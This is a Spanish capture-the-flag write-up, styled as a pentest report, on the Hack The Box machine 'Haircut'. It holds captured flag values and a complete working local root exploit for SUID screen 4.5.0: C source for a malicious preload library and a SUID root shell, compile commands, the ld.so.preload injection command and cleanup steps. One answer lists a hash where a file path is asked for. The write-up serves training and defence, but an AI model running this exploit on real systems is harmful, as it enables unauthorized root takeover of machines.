---
title: "Informe Técnico: Haircut (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Haircut de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Haircut

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Haircut** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Haircut |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many TCP ports are listening on Haircut?**

R:  2

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_01.png)

What is the relative path to the directory that is discoverable on the webserver?

R:  /uploads

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_02.png)

**What is the relative path to the PHP page that checks "Hairdresser's location"?**

R: /exposed.php

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_04.png)

**What common Linux program / library is the site using to fetch webpages?**

R: curl

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_05.png)

**What is the single character curl option to save a file to the given location?**

R: O

**What user is the website running as?**

R: www-data 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_06.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_08.png)

**Submit the flag located in the maria user's home directory.**

R: 18a4d7ec7fdb788a666d77c601c9914c

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_09.png)

What is the full path of the file owned by root that has the SetUID permission and has to do with terminal management?

R: fe0735e95f5cc665993b2653cc28c844

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_10.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/haircut/images/step_11.png)

> 
> 
> 
> # Haircut (HTB) – Privesc con `screen` 4.5.0 (ld.so.preload)
> 
> ## 0) Requisitos rápidos (sanity check)
> 
> ```bash
> bash
> CopiarEditar
> screen -v                          # Debe ser 4.5.0
> ls -l $(command -v screen)         # Debe tener SUID root: -rwsr-xr-x root root ...
> 
> ```
> 
> > Si no es 4.5.0 o no es SUID → este vector no aplica.
> > 
> 
> ---
> 
> ## 1) Fix del entorno de compilación
> 
> En la víctima (no en tu Kali) a veces `gcc` no encuentra `cc1` por PATH roto o instalación mínima.
> 
> ```bash
> bash
> CopiarEditar
> export PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH
> which gcc || echo "gcc no está instalado en la víctima"
> 
> ```
> 
> - **Error que viste:** `gcc: error trying to exec 'cc1': execvp: No such file or directory`
>     
>     **Causa:** PATH incorrecto / toolchain incompleto.
>     
>     **Mitigación:** Ajustar PATH como arriba. Si **no hay gcc**, compila en tu Kali los binarios/so y súbelos a `/tmp` de la víctima.
>     
> 
> ---
> 
> ## 2) Biblioteca maliciosa (`/tmp/libhax.so`)
> 
> **Objetivo:** aprovechar `ld.so.preload` para ejecutar nuestro constructor al arrancar cualquier binario setuid (o al forzar carga). El constructor cambia owner/perm de `/tmp/rootshell`, borra preload y sale.
> 
> ### 2.1) Fuente corregido (con *headers* correctos)
> 
> > Tus “implicit declaration” venían por falta de headers: chmod() está en <sys/stat.h>, chown()/unlink() en <unistd.h>.
> > 
> 
> ```c
> c
> CopiarEditar
> // /tmp/libhax.c
> #include <stdio.h>
> #include <sys/types.h>
> #include <sys/stat.h>   // chmod()
> #include <unistd.h>     // chown(), unlink()
> 
> __attribute__((constructor))
> void dropshell(void) {
>     chown("/tmp/rootshell", 0, 0);
>     chmod("/tmp/rootshell", 04755);
>     unlink("/etc/ld.so.preload");
>     printf("[+] done!\n");
> }
> 
> ```
> 
> ### 2.2) Guardar y compilar
> 
> ```bash
> bash
> CopiarEditar
> cat > /tmp/libhax.c <<'EOF'
> #include <stdio.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <unistd.h>
> 
> __attribute__((constructor))
> void dropshell(void) {
>     chown("/tmp/rootshell", 0, 0);
>     chmod("/tmp/rootshell", 04755);
>     unlink("/etc/ld.so.preload");
>     printf("[+] done!\n");
> }
> EOF
> 
> gcc -fPIC -shared -o /tmp/libhax.so /tmp/libhax.c -ldl
> 
> ```
> 
> - **Si aún sale el warning de `chmod`/`chown`:** revisa que pegaste **exactamente** los `#include` y que no hay caracteres raros.
> - **Si no hay `gcc`:** compílalo en tu Kali y súbelo:
>     
>     ```bash
>     bash
>     CopiarEditar
>     # En Kali
>     gcc -fPIC -shared -o libhax.so libhax.c -ldl
>     # Subir a víctima como /tmp/libhax.so
>     
>     ```
>     
> 
> ---
> 
> ## 3) Rootshell SUID (`/tmp/rootshell`)
> 
> **Objetivo:** tener un binario que eleve a root cuando el preload dispare el constructor.
> 
> ### 3.1) Fuente corregido
> 
> > Usamos execl("/bin/sh", "sh", "-p", NULL) para mantener privilegios (-p en dash/bash). Añadimos headers de set*id() y execl().
> > 
> 
> ```c
> c
> CopiarEditar
> // /tmp/rootshell.c
> #include <unistd.h>   // setuid, setgid, seteuid, setegid, execl
> #include <stdlib.h>
> 
> int main(void) {
>     setuid(0); setgid(0);
>     seteuid(0); setegid(0);
>     execl("/bin/sh", "sh", "-p", NULL);
>     return 0;
> }
> 
> ```
> 
> ### 3.2) Guardar y compilar
> 
> ```bash
> bash
> CopiarEditar
> cat > /tmp/rootshell.c <<'EOF'
> #include <unistd.h>
> #include <stdlib.h>
> 
> int main(void) {
>     setuid(0); setgid(0);
>     seteuid(0); setegid(0);
>     execl("/bin/sh", "sh", "-p", NULL);
>     return 0;
> }
> EOF
> 
> gcc -o /tmp/rootshell /tmp/rootshell.c
> 
> ```
> 
> - **Tus warnings anteriores** (`implicit declaration of setuid/setgid/.../execvp`) → faltaban `<unistd.h>` y además `execvp` estaba mal usado (necesita `argv[]`). Con `execl` evitamos eso.
> 
> ---
> 
> ## 4) Abusar de `screen` para escribir `/etc/ld.so.preload`
> 
> **Objetivo:** inyectar la ruta de nuestra `.so` en `ld.so.preload` usando la funcionalidad SUID de `screen`.
> 
> ```bash
> bash
> CopiarEditar
> umask 000
> /usr/bin/screen -D -m -L ld.so.preload echo -ne '\n/tmp/libhax.so'
> /usr/bin/screen -ls
> 
> ```
> 
> - `umask 000`: asegura permisos mundiales al archivo que se cree.
> - El primer comando **fuerza a `screen` (SUID root)** a crear/escribir `ld.so.preload` con la línea `/tmp/libhax.so`.
> - `screen -ls` **dispara la carga** y por tanto el constructor de `libhax.so`.
> 
> **Verifica:**
> 
> ```bash
> bash
> CopiarEditar
> cat /etc/ld.so.preload    # Debe contener: /tmp/libhax.so
> 
> ```
> 
> ---
> 
> ## 5) Gana root y limpia (OPSEC)
> 
> ```bash
> bash
> CopiarEditar
> /tmp/rootshell
> id
> # Deberías ser root
> 
> # Limpieza (muy importante):
> : > /etc/ld.so.preload
> rm -f /tmp/libhax.so /tmp/libhax.c /tmp/rootshell.c
> # (Opcional) deja /tmp/rootshell o bórralo si ya pillaste la flag
> 
> ```
> 
> ---
> 
> ## 6) Validación final
> 
> ```bash
> bash
> CopiarEditar
> file /tmp/rootshell
> # Debe ser ELF 64-bit (o 32-bit según la máquina), dinámicamente enlazado, not stripped
> 
> ls -l /tmp/rootshell
> # Tras el exploit, owner debe ser root y modo -rwsr-xr-x (4755)
> 
> ```
> 
> Flag:
> 
> ```bash
> bash
> CopiarEditar
> cat /root/root.txt
> 
> ```
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
